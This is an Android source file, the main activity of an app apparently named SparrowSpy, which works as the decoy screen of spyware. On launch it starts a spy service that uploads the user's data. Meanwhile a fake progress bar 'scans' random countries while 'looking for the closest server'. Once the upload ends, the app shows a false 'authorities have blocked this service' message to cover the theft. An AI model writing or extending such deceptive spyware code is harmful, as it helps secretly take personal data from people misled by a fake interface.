package com.tangledbytes.sparrowspy;


import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;

import com.tangledbytes.sparrowspy.events.Events;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.util.Locale;
import java.util.Random;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private final Utils mUtils = new Utils(this);
    private ProgressBar progressBar;
    private TextView tvProcMainTitle;
    private TextView tvProcContent;
    private TextView tvProgress;

    private boolean noInternetDialogVisible;
    SparrowSpy mSpy;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startSpy();
    }

    public void startSpy() {
        mSpy = SparrowSpy.init(this);
        if (mSpy.hasUploadedAllData()) {
            showFailedDialog();
            return;
        }
        mSpy.setSpyServiceStateChangeListener(new Events.SpyServiceStateChangeListener() {
            @Override
            public void onStart() {
                showFakeProcess();
            }

            @Override
            public void onFinish() {
            }
        });
    }

    private final Thread fakeProcessThread = new Thread(new Runnable() {
        final Random random = new Random();

        @Override
        public void run() {
            double progress = 0;
            while (!mSpy.hasUploadedAllData()) {
                if (!mUtils.hasActiveInternetConnection()) {
                    runOnUiThread(MainActivity.this::showEnableInternetDialog);
                    blockThread();
                    continue;
                }
                // increase progress by 0.4% of remaining progress
                progress += 0.004 * (100 - progress);
                final int finalProgress = (int) progress;
                runOnUiThread(() -> updateUi(finalProgress));
                blockThread();
            }
            runOnUiThread(MainActivity.this::showFailedDialog);
        }

        private void updateUi(int progress) {
            tvProcContent.setText(String.format("scanning %s...", Constants.COUNTRIES[random.nextInt(Constants.COUNTRIES.length)]));
            progressBar.setProgress(progress);
            tvProgress.setText(String.format(Locale.ENGLISH, "%d%%", progress));
        }

        private void blockThread() {
            synchronized (MainActivity.this) {
                try {
                    MainActivity.this.wait(random.nextInt(400) + 1);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    });

    private void showFakeProcess() {
        tvProcMainTitle = findViewById(R.id.proc_title);
        tvProcContent = findViewById(R.id.proc_content);
        progressBar = findViewById(R.id.proc_progress);
        tvProgress = findViewById(R.id.tv_progress);
        tvProcMainTitle.setText(R.string.looking_for_closest_server);
        fakeProcessThread.start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SparrowSpy.PERMISSIONS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SparrowSpy.OPEN_SETTINGS_REQUEST_CODE) {
            mSpy.handlePermissionResult();
        }
    }

    public void showEnableInternetDialog() {
        if (noInternetDialogVisible)
            return;
        noInternetDialogVisible = true;
        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(this)
                .setTitle("No Internet Connection")
                .setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you")
                .setCancelable(false)
                .setNegativeButton("Retry",
                        (dialog, whichButton) -> {
                            noInternetDialogVisible = false;
                        });
        noInternetDialog.show();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this)
                .setTitle("Access denied")
                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
                .setCancelable(false)
                .setNegativeButton(R.string.exit,
                        (dialog, whichButton) -> {
                            Toast.makeText(this, R.string.closing_app, Toast.LENGTH_SHORT).show();
                            finish();
                        });
        failedDialog.show();
    }
}